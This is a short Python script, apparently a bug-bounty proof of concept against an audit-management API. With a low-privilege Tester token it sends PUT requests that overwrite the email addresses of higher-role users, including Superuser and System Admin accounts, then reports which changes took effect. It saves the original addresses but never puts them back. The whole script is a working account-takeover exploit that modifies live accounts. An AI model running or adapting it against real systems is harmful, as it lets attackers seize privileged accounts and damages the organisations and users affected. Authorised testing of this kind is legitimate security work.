import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/tok_Tester').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def user(uid):
    c,b=req('GET',f'/api/v1/users/{uid}')
    try: return json.loads(b)['users'][0]
    except: return {}
ROLE={1:'Superuser',2:'System Admin',3:'Reviewer',4:'Tester',5:'Owner',6:'Ext Auditor',11:'Third Party'}
targets=[(1,1),(53,2),(171,3),(313,4),(230,5),(172,6),(315,11)]
print("=== Tester(role 4) email write vs target role — UNIQUE address per attempt ===")
print(f"{'target':>6} {'role':14} {'PUT':>5}  result")
for uid,role in targets:
    u=user(uid)
    if not u: print(f"{uid:>6} unreadable"); continue
    before=u.get('email')
    uniq=f"zx-{uuid.uuid4().hex[:10]}@bugcrowdninja.com"
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"email":uniq}})
    after=user(uid).get('email')
    landed = after==uniq
    detail=''
    if not landed:
        try: detail=json.loads(b)['errors'][0].get('detail','')[:60]
        except: detail=b[:60]
    print(f"{uid:>6} {ROLE.get(role,'?'):14} {c:>5}  {'*** LANDED ***' if landed else 'no: '+detail}")
